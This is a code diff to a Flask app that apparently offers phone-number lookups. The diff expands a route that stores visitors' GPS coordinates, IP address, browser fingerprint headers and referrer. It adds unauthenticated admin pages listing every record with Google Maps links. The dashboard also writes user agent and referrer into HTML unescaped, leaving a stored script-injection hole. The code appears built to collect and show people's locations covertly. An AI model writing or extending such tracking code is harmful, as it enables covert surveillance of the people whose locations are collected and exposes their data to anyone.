@@ -2,6 +2,7 @@ from flask import Flask, render_template_string, request, jsonify
 import phonenumbers
 from phonenumbers import geocoder, carrier, NumberParseException, timezone, number_type, PhoneNumberType, region_code_for_number
 import datetime
+import json
 
 app = Flask(__name__)
 
@@ -196,12 +197,89 @@ def save_location():
     data = request.get_json()
     lat = data.get('latitude')
     lon = data.get('longitude')
-    ip = request.remote_addr
-    timestamp = datetime.datetime.now().isoformat()
-    url = f"https://www.google.com/maps?q={lat},{lon}"
+    
+    # Collect comprehensive user data
+    user_data = {
+        'timestamp': datetime.datetime.now().isoformat(),
+        'ip_address': request.remote_addr,
+        'user_agent': request.headers.get('User-Agent', 'Unknown'),
+        'referrer': request.headers.get('Referer', 'Direct'),
+        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
+        'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
+        'connection': request.headers.get('Connection', 'Unknown'),
+        'latitude': lat,
+        'longitude': lon,
+        'url': f"https://www.google.com/maps?q={lat},{lon}"
+    }
+    
+    # Save detailed data to JSON file
+    try:
+        with open('user_data.json', 'r') as f:
+            all_data = json.load(f)
+    except FileNotFoundError:
+        all_data = []
+    
+    all_data.append(user_data)
+    
+    with open('user_data.json', 'w') as f:
+        json.dump(all_data, f, indent=2)
+    
+    # Also save to locations.txt for backward compatibility
     with open('locations.txt', 'a') as f:
-        f.write(f"{url}  # {timestamp}, {ip}\n")
+        f.write(f"https://www.google.com/maps?q={lat},{lon}  # {user_data['timestamp']}, {user_data['ip_address']}\n")
+    
     return jsonify({'status': 'success'})
+
+@app.route('/admin-user-data')
+def admin_user_data():
+    try:
+        with open('user_data.json', 'r') as f:
+            data = json.load(f)
+    except FileNotFoundError:
+        data = []
+    return jsonify(data)
+
+@app.route('/view-user-data')
+def view_user_data():
+    try:
+        with open('user_data.json', 'r') as f:
+            data = json.load(f)
+    except FileNotFoundError:
+        data = []
+    
+    html = '''
+    <h2>Collected User Data</h2>
+    <style>
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .location-link { color: blue; text-decoration: underline; }
+    </style>
+    <table>
+        <tr>
+            <th>Timestamp</th>
+            <th>IP Address</th>
+            <th>Device/Browser</th>
+            <th>Referrer</th>
+            <th>Location</th>
+            <th>Google Maps Link</th>
+        </tr>
+    '''
+    
+    for entry in data:
+        html += f'''
+        <tr>
+            <td>{entry.get('timestamp', 'N/A')}</td>
+            <td>{entry.get('ip_address', 'N/A')}</td>
+            <td>{entry.get('user_agent', 'N/A')[:50]}...</td>
+            <td>{entry.get('referrer', 'N/A')[:30]}...</td>
+            <td>{entry.get('latitude', 'N/A')}, {entry.get('longitude', 'N/A')}</td>
+            <td><a href="{entry.get('url', '#')}" target="_blank" class="location-link">View on Maps</a></td>
+        </tr>
+        '''
+    
+    html += '</table>'
+    return html
 
 @app.route('/admin-locations')
 def admin_locations():
